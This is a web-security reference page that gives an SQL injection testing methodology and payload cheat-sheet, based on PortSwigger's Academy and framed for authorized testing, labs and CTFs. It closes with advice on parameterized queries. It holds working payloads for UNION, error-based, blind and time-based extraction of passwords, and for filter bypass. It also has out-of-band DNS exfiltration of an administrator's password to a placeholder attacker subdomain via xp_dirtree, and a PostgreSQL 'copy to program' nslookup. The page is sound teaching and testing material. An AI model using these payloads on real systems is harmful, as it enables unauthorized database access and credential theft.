Web application security · reference methodology

# SQL Injection Testing Methodology

A decision flow for classifying what kind of SQL injection you're looking at, paired with a payload cheat-sheet for exploiting each kind once you know. Built for authorized testing: CTFs, labs, and engagements you're scoped to test.

Techniques and payload syntax drawn from [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection).

Follow the solid spine top to bottom to classify the injection; dashed arrows are parallel checks worth running alongside it, not sequential steps. Every box opens its matching cheat-sheet section below.

next step parallel / worth checking too yes / no — which way the test result sends you

## 01 · Detection

**Detecting SQL injection**run against every parameter, header, and cookie

Most SQL injection sits in the `WHERE` clause of a `SELECT`, but it also turns up in `UPDATE`/`INSERT` values, in table or column names, and in `ORDER BY` clauses — so test every controllable input, not just the obvious search box. For each entry point, send:

```
'
' OR 1=1--
' OR 1=2--
```

A single quote that breaks the query (an error, a blank page, a changed result count) is your first signal. `OR 1=1` vs `OR 1=2` tells you whether you can influence the query's logic. If neither produces a visible difference, move down the flowchart into conditional-error, time-delay, and OOB probes — covered in their own sections below.

Classic examples once you have a foothold:

```
https://insecure-website.com/products?category=Gifts'--
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

And for a login form, submitting the username `administrator'--` with any password comments out the password check entirely.

Tip: Burp Scanner automates this probing step reliably across an entire app; use manual testing to confirm and extend what it finds.

## 02 · In-context checks (run alongside detection)

**SQL injection in different contexts**not every input is a query-string parameter

Some apps build queries from JSON or XML request bodies instead of query parameters. These formats give you extra ways to smuggle a blocked keyword past a filter — for example, this XML-encoded `S` decodes to `SELECT` server-side before it reaches the SQL interpreter:

```
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Also check `ORDER BY` parameters (sort fields), table/column-name parameters, and any field that ends up in an `UPDATE` or `INSERT` — parameterized queries can't protect identifiers or clause keywords the way they protect values, so these spots are frequently missed by developers.

**Second-order SQL injection**the payload lands safely, then detonates later

First-order SQLi happens the moment a request is processed. Second-order (stored) SQLi happens when an app safely stores your input — a username, a display name, a profile field — and only mishandles it later, when a *different* feature reads that stored value back into a new query.

Methodology: register or submit data containing SQL metacharacters in every field that gets persisted and re-displayed or re-used elsewhere (profile name, address, support ticket subject), then exercise every other feature that might read that field back into a query — password resets, admin panels, reports, exports, search indexes — and watch for injection effects there instead of at the original entry point.

**Bypassing filters & WAFs**when a keyword or character gets blocked

SQL keywords aren't case-sensitive, so a filter matching `SELECT` literally often misses `SeLeCT`. Inline comments can stand in for whitespace to dodge a filter that expects a keyword surrounded by spaces:

```
SeLeCT username FrOm users
SELECT/**/username/**/FROM/**/users
```

MySQL executes the contents of a versioned comment while hiding the keyword from naive filters:

```
/*!SELECT*/ username FROM users
```

Beyond syntax tricks, switching the whole payload's encoding (URL-encoding, XML entity encoding as shown in the context section above, or building strings with `CHAR()` instead of quotes) defeats filters that only inspect the request in its most common form.

**Fingerprinting & examining the database**do this early — it decides every payload below

Database version, via UNION or any context where the result reaches you:

| Oracle | `SELECT * FROM v$version` · `SELECT banner FROM v$version` |
| --- | --- |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

```
' UNION SELECT @@version--
```

Listing tables and columns — every mainstream database except Oracle exposes an `information_schema`:

```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'USERS'
```

On Oracle, use the vendor-specific views instead:

```
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

Knowing the engine tells you which string-concatenation operator, comment style, and OOB technique apply — see the per-database tables in the sections below.

## 03 · Exploitation paths (pick the one the flowchart sends you to)

**UNION-based attacks**the query's results come back in the response

**Step 1 — find the column count.** Increment an `ORDER BY` index until it errors:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <- errors once you pass the real column count
```

Or increment the number of `NULL`s in a `UNION SELECT` — `NULL` is valid for any data type, so this only errors on a wrong count:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Step 2 — find string-friendly columns.** Once the count matches, swap each position for a string in turn:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

A type-conversion error marks that column unusable for text; content that echoes back marks it usable.

**Step 3 — pull real data** through a usable column, once you know a table/column name exists (see Fingerprinting):

```
' UNION SELECT username, password FROM users--
```

**Only one usable column?** Concatenate multiple values into it with a separator so you can split them back apart:

```
' UNION SELECT username || '~' || password FROM users--   -- Oracle
```

| Oracle | Needs a real table: `' UNION SELECT NULL FROM DUAL--` |
| --- | --- |
| Microsoft | `--` or `/* */` comments; concatenate with `'foo'+'bar'` |
| PostgreSQL | `--` or `/* */` comments; concatenate with `'foo'\|\|'bar'` |
| MySQL | `#`, or `-- ` (note the required trailing space); concatenate with `CONCAT('foo','bar')` |

**Error-based SQL injection**the database's own errors do the talking

**Conditional errors** — make the query throw only when a condition is true, then watch for the app's error response:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   <- throws: divide by zero
```

Chained into character-by-character extraction:

```
xyz' AND (SELECT CASE WHEN (Username='Administrator' AND SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a
```

| Oracle | `SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| --- | --- |
| Microsoft | `SELECT CASE WHEN (cond) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(cond,(SELECT table_name FROM information_schema.tables),'a')` |

**Verbose errors that leak data directly** — force a type conversion on data you want to read:

```
CAST((SELECT example_column FROM example_table) AS int)
```

| Microsoft | `SELECT 'foo' WHERE 1=(SELECT 'secret')` → conversion error echoes `secret` |
| --- | --- |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` → `invalid input syntax for integer: "secret"` |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT 'secret')))` → XPath error echoes `secret` |

**Blind SQL injection — boolean-based**no errors, no output, just a changed response

Find a condition that flips some visible behavior (a "welcome back" message, a redirect, a response length):

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

Then extract data one character at a time with a binary search against `SUBSTRING` (called `SUBSTR` on Oracle/MySQL):

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 't
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) = 's
```

Repeat per character, per position, until the full value is recovered. This is slow by hand — script it (Burp Intruder, or a small loop) once the condition is confirmed to work.

**Blind SQL injection — time-based**the app handles errors gracefully, so delay the response instead

Unconditional delay, to confirm the technique works at all:

| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| --- | --- |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

Conditional delay — the actual extraction primitive:

| Oracle | `SELECT CASE WHEN (cond) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| --- | --- |
| Microsoft | `IF (cond) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(cond,SLEEP(10),'a')` |

Example on Microsoft SQL Server, extracting one character:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

'; IF (SELECT COUNT(Username) FROM Users
       WHERE Username='Administrator' AND SUBSTRING(Password,1,1)>'m') = 1
   WAITFOR DELAY '0:0:10'--
```

**Blind SQL injection — out-of-band (OAST)**works even when nothing comes back synchronously

When the query runs async, or errors and timing are both suppressed, trigger a DNS lookup to a domain you control (a [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) subdomain is the easiest way to generate and monitor one):

| Microsoft | `exec master..xp_dirtree '//YOUR-SUBDOMAIN/a'` |
| --- | --- |
| Oracle | Patched XXE path: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` Privileged path: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN')` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN'` |
| MySQL | Windows only: `LOAD_FILE('\\\\YOUR-SUBDOMAIN\\a')` or `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN\a'` |

Once the lookup fires, fold the data you want straight into the subdomain to exfiltrate it directly — here on Microsoft SQL Server:

```
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN/a"')--
```

The resulting DNS query reveals the secret directly: `S3cure.your-subdomain.oastify.com`. Because it works whether or not the response changes at all, OAST is often worth trying first, not just last.

## 04 · Fix

**Prevention**what to recommend once you've proven the bug

Parameterized queries (prepared statements) remove the vulnerability class for any value position — `WHERE` clauses, `INSERT`/`UPDATE` values:

```
PreparedStatement statement = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

Parameters can't protect table/column names or `ORDER BY` clauses, since those aren't values — whitelist the permitted identifiers there instead, or restructure the logic so untrusted input never selects an identifier directly. The query string itself must always be a hard-coded constant: never decide case-by-case that some concatenated input is "safe enough" to skip parameterization.

Reference only — use against systems you own or are explicitly authorized to test. Source: [PortSwigger Web Security Academy, SQL injection](https://portswigger.net/web-security/sql-injection).